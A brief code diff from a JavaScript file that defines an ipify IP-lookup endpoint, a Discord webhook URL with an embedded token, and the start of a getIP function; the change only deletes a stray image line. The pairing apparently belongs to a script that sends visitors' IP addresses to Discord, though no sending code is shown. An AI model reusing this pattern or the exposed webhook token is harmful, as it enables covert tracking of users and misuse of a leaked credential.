@@ -3,7 +3,6 @@ const ipifyAPI = "https://api.ipify.org?format=json";
 
 
 const webhookURL = "https://discord.com/api/webhooks/1528810563461845145/zlNGcv_sS1KVrlxO9m33CEFUQKfNaZf25-qvbd_OUD4WE20fWSxWo9m75xTLrpgbVNmX";
-"image": "https://ew.com/thmb/0sn-Oz90GZTSVLF6cJ0EsApoRKA=/2000x0/filters:no_upscale():max_bytes(150000):strip_icc()/b31-92532f841b9349638d226a6c62aa9e85.jpg"
 
 
 async function getIP() {
